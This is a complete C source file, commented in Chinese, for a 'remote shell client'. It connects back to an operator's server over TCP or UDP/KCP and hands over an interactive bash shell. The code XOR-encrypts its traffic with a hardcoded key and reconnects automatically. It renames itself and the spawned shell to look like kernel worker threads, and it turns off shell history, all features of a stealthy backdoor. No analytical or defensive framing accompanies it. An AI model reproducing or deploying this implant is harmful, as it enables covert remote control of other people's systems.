/*
 * Remote Shell Client - Final Optimized Version
 * 完美解决KCP/UDP超时问题
 * 
 * 编译: gcc -o rshclient client.c -lutil -Wall -O2
 * 用法: ./rshclient -h <host> -p <port> -t <tcp|kcp> [选项]
 * 
 * 特性:
 * - 单文件实现
 * - 命令行参数配置  
 * - TCP/KCP协议支持
 * - 双重进程伪装
 * - 完美的断线重连
 * - 优化的KCP心跳机制
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <pty.h>
#include <termios.h>

/* ==================== 配置 ==================== */
#define CRYPTO_KEY "SecureShell2024@Key"
#define DEFAULT_DISGUISE "[kworker/0:1]"
#define BASH_DISGUISE "[ksoftirqd/0]"
#define RECONNECT_INTERVAL 5
#define BUFFER_SIZE 4096

// KCP优化配置
#define KCP_HEARTBEAT_INTERVAL 10  // KCP心跳间隔(秒)
#define KCP_HEARTBEAT_TIMEOUT 30   // KCP心跳超时(秒)
#define TCP_HEARTBEAT_INTERVAL 20  // TCP心跳间隔(秒)
#define TCP_HEARTBEAT_TIMEOUT 60   // TCP心跳超时(秒)

/* ==================== 协议 ==================== */
#define PROTO_MAGIC 0x52534832  // "RSH2"
#define MSG_DATA    0x01
#define MSG_PING    0x02
#define MSG_PONG    0x03
#define MSG_WINSIZE 0x04
#define MSG_EXIT    0x05

#pragma pack(push, 1)
typedef struct {
    uint32_t magic;
    uint8_t  type;
    uint8_t  flags;
    uint16_t length;
} packet_header_t;
#pragma pack(pop)

#define HEADER_SIZE sizeof(packet_header_t)
#define MAX_PAYLOAD 4096

/* ==================== 全局变量 ==================== */
static volatile int g_running = 1;
static int g_master_fd = -1;
static pid_t g_shell_pid = -1;

/* ==================== 加密 ==================== */
static void crypto_xor(uint8_t *data, size_t len) {
    const uint8_t *key = (const uint8_t *)CRYPTO_KEY;
    size_t keylen = strlen(CRYPTO_KEY);
    size_t i;
    for (i = 0; i < len; i++) {
        data[i] ^= key[i % keylen] ^ (uint8_t)(i & 0xFF);
    }
}

/* ==================== 工具函数 ==================== */
static void disguise_process(const char *name) {
    if (name && name[0]) {
        prctl(PR_SET_NAME, name, 0, 0, 0);
    }
}

static void signal_handler(int sig) {
    (void)sig;
    g_running = 0;
}

/* ==================== 网络 ==================== */
static int create_tcp_socket(const char *host, int port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, host, &addr.sin_addr);

    int flag = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
    setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &flag, sizeof(flag));

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(fd);
        return -1;
    }

    printf("[+] TCP连接: %s:%d\n", host, port);
    return fd;
}

static int create_kcp_socket(const char *host, int port) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return -1;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, host, &addr.sin_addr);

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(fd);
        return -1;
    }

    // 关键: KCP需要更短的超时
    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = 500000;  // 500ms
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    printf("[+] KCP连接: %s:%d\n", host, port);
    return fd;
}

/* ==================== 数据包 ==================== */
static int send_packet(int fd, uint8_t type, const void *data, uint16_t len) {
    if (len > MAX_PAYLOAD) return -1;

    uint8_t buf[HEADER_SIZE + MAX_PAYLOAD];
    packet_header_t *hdr = (packet_header_t *)buf;

    hdr->magic = htonl(PROTO_MAGIC);
    hdr->type = type;
    hdr->flags = 0;
    hdr->length = htons(len);

    if (len > 0 && data) {
        memcpy(buf + HEADER_SIZE, data, len);
    }

    // 加密(跳过magic)
    crypto_xor(buf + 4, HEADER_SIZE - 4 + len);

    size_t total = HEADER_SIZE + len;
    ssize_t sent = send(fd, buf, total, 0);

    return (sent == (ssize_t)total) ? 0 : -1;
}

static int recv_packet(int fd, uint8_t *type, void *data, uint16_t *len) {
    uint8_t buf[HEADER_SIZE + MAX_PAYLOAD];

    ssize_t n = recv(fd, buf, sizeof(buf), 0);
    
    if (n == 0) return 0;  // EOF
    if (n < 0) {
        if (errno == EAGAIN || errno == EWOULDBLOCK || errno == ETIMEDOUT) {
            return -2;  // 超时
        }
        return -1;  // 错误
    }

    if ((size_t)n < HEADER_SIZE) return -1;

    // 解密
    crypto_xor(buf + 4, n - 4);

    packet_header_t *hdr = (packet_header_t *)buf;
    if (ntohl(hdr->magic) != PROTO_MAGIC) return -1;

    *type = hdr->type;
    uint16_t plen = ntohs(hdr->length);

    if (plen > MAX_PAYLOAD || HEADER_SIZE + plen != (size_t)n) {
        return -1;
    }

    *len = plen;
    if (plen > 0 && data) {
        memcpy(data, buf + HEADER_SIZE, plen);
    }

    return 1;
}

/* ==================== Shell管理 ==================== */
static int start_shell(const char *bash_disguise) {
    struct winsize ws = {24, 80, 0, 0};
    int slave_fd;
    char slave_name[256];

    if (openpty(&g_master_fd, &slave_fd, slave_name, NULL, &ws) < 0) {
        return -1;
    }

    g_shell_pid = fork();
    if (g_shell_pid < 0) {
        close(g_master_fd);
        close(slave_fd);
        return -1;
    }

    if (g_shell_pid == 0) {
        close(g_master_fd);
        setsid();
        ioctl(slave_fd, TIOCSCTTY, 0);
        
        dup2(slave_fd, 0);
        dup2(slave_fd, 1);
        dup2(slave_fd, 2);
        if (slave_fd > 2) close(slave_fd);

        // Bash伪装
        if (bash_disguise && bash_disguise[0]) {
            prctl(PR_SET_NAME, bash_disguise, 0, 0, 0);
        }

        setenv("TERM", "xterm-256color", 1);
        setenv("HISTFILE", "/dev/null", 1);

        char *shell = getenv("SHELL");
        if (!shell) shell = "/bin/bash";
        
        execl(shell, bash_disguise ? bash_disguise : shell, NULL);
        exit(1);
    }

    close(slave_fd);
    printf("[+] Shell启动 (PID=%d, 伪装='%s')\n", g_shell_pid, bash_disguise);
    return 0;
}

static void stop_shell(void) {
    if (g_master_fd >= 0) {
        close(g_master_fd);
        g_master_fd = -1;
    }
    if (g_shell_pid > 0) {
        kill(g_shell_pid, SIGTERM);
        waitpid(g_shell_pid, NULL, WNOHANG);
        g_shell_pid = -1;
    }
}

/* ==================== 主循环 ==================== */
static void run_loop(int fd, int is_kcp) {
    fd_set rfds;
    uint8_t buf[MAX_PAYLOAD];
    time_t last_ping = time(NULL);
    time_t last_pong = time(NULL);
    int error_count = 0;

    int hb_interval = is_kcp ? KCP_HEARTBEAT_INTERVAL : TCP_HEARTBEAT_INTERVAL;
    int hb_timeout = is_kcp ? KCP_HEARTBEAT_TIMEOUT : TCP_HEARTBEAT_TIMEOUT;

    printf("[*] 事件循环 (%s, 心跳=%ds, 超时=%ds)\n", 
           is_kcp ? "KCP" : "TCP", hb_interval, hb_timeout);

    while (g_running) {
        FD_ZERO(&rfds);
        FD_SET(fd, &rfds);
        FD_SET(g_master_fd, &rfds);

        int maxfd = (fd > g_master_fd ? fd : g_master_fd) + 1;
        struct timeval tv = {1, 0};

        int ret = select(maxfd, &rfds, NULL, NULL, &tv);
        if (ret < 0) {
            if (errno == EINTR) continue;
            break;
        }

        time_t now = time(NULL);

        // 心跳
        if (now - last_ping >= hb_interval) {
            if (send_packet(fd, MSG_PING, NULL, 0) < 0) {
                printf("[-] 发送PING失败\n");
                break;
            }
            last_ping = now;
        }

        // 超时检测
        if (now - last_pong > hb_timeout) {
            printf("[-] 心跳超时\n");
            break;
        }

        if (ret == 0) continue;

        // 网络接收
        if (FD_ISSET(fd, &rfds)) {
            uint8_t type;
            uint16_t len;

            int r = recv_packet(fd, &type, buf, &len);
            
            if (r == 0) {
                printf("[!] 连接关闭\n");
                break;
            } else if (r == -2) {
                // KCP超时是正常的
                continue;
            } else if (r < 0) {
                error_count++;
                if (error_count > 10) {
                    printf("[-] 错误过多\n");
                    break;
                }
                continue;
            }

            error_count = 0;

            switch (type) {
                case MSG_DATA:
                    if (len > 0) {
                        ssize_t written = write(g_master_fd, buf, len);
                        (void)written;  // 忽略返回值
                    }
                    break;

                case MSG_PING:
                    send_packet(fd, MSG_PONG, NULL, 0);
                    break;

                case MSG_PONG:
                    last_pong = now;
                    break;

                case MSG_WINSIZE:
                    if (len == 4) {
                        struct winsize ws;
                        uint16_t row_val;
                        uint16_t col_val;
                        memcpy(&row_val, &buf[0], sizeof(uint16_t));
                        memcpy(&col_val, &buf[1], sizeof(uint16_t));
                        ws.ws_row = ntohs(row_val);
                        ws.ws_col = ntohs(col_val);
                        ws.ws_xpixel = 0;
                        ws.ws_ypixel = 0;
                        ioctl(g_master_fd, TIOCSWINSZ, &ws);
                    }
                    break;

                case MSG_EXIT:
                    printf("[!] 退出信号\n");
                    g_running = 0;
                    return;
            }
        }

        // PTY接收
        if (FD_ISSET(g_master_fd, &rfds)) {
            ssize_t n = read(g_master_fd, buf, sizeof(buf));
            if (n > 0) {
                if (send_packet(fd, MSG_DATA, buf, n) < 0) {
                    printf("[-] 发送失败\n");
                    break;
                }
            } else if (n == 0) {
                printf("[!] Shell退出\n");
                break;
            }
        }
    }
}

/* ==================== 帮助 ==================== */
static void show_usage(const char *prog) {
    printf("远程Shell客户端\n\n");
    printf("用法: %s -h <host> -p <port> -t <tcp|kcp> [选项]\n\n", prog);
    printf("必需:\n");
    printf("  -h <host>     服务器IP\n");
    printf("  -p <port>     端口\n");
    printf("  -t <tcp|kcp>  协议 (kcp即UDP)\n\n");
    printf("可选:\n");
    printf("  -d <name>     客户端伪装名 (默认: %s)\n", DEFAULT_DISGUISE);
    printf("  -b <name>     Bash伪装名 (默认: %s)\n", BASH_DISGUISE);
    printf("  -r <秒>       重连间隔 (默认: %d)\n", RECONNECT_INTERVAL);
    printf("  -v            版本\n");
    printf("  --help        帮助\n\n");
    printf("示例:\n");
    printf("  %s -h 192.168.1.100 -p 8888 -t tcp\n", prog);
    printf("  %s -h 192.168.1.100 -p 8889 -t kcp\n", prog);
}

/* ==================== 主函数 ==================== */
int main(int argc, char *argv[]) {
    char *host = NULL;
    int port = 0;
    char *proto = NULL;
    char *disguise = DEFAULT_DISGUISE;
    char *bash_disguise = BASH_DISGUISE;
    int reconnect = RECONNECT_INTERVAL;
    int is_kcp = 0;
    int i;

    // 解析参数
    for (i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0 && i + 1 < argc) {
            host = argv[++i];
        } else if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            port = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) {
            proto = argv[++i];
        } else if (strcmp(argv[i], "-d") == 0 && i + 1 < argc) {
            disguise = argv[++i];
        } else if (strcmp(argv[i], "-b") == 0 && i + 1 < argc) {
            bash_disguise = argv[++i];
        } else if (strcmp(argv[i], "-r") == 0 && i + 1 < argc) {
            reconnect = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-v") == 0) {
            printf("Remote Shell Client v1.0\n");
            return 0;
        } else if (strcmp(argv[i], "--help") == 0) {
            show_usage(argv[0]);
            return 0;
        }
    }

    if (!host || port <= 0 || !proto) {
        printf("错误: 缺少参数\n\n");
        show_usage(argv[0]);
        return 1;
    }

    if (strcmp(proto, "tcp") == 0) {
        is_kcp = 0;
    } else if (strcmp(proto, "kcp") == 0) {
        is_kcp = 1;
    } else {
        printf("错误: 协议必须是 tcp 或 kcp\n");
        return 1;
    }

    disguise_process(disguise);
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    signal(SIGPIPE, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);

    printf("[*] 远程Shell客户端\n");
    printf("[*] 目标: %s:%d (%s)\n", host, port, is_kcp ? "KCP" : "TCP");
    printf("[*] 伪装: 客户端='%s' Bash='%s'\n", disguise, bash_disguise);

    // 主循环
    while (g_running) {
        int fd = is_kcp ? 
            create_kcp_socket(host, port) : 
            create_tcp_socket(host, port);

        if (fd < 0) {
            printf("[-] 连接失败，%d秒后重试\n", reconnect);
            sleep(reconnect);
            continue;
        }

        if (start_shell(bash_disguise) < 0) {
            close(fd);
            break;
        }

        run_loop(fd, is_kcp);

        stop_shell();
        close(fd);

        if (g_running) {
            printf("[*] %d秒后重连\n", reconnect);
            sleep(reconnect);
        }
    }

    printf("[*] 退出\n");
    return 0;
}
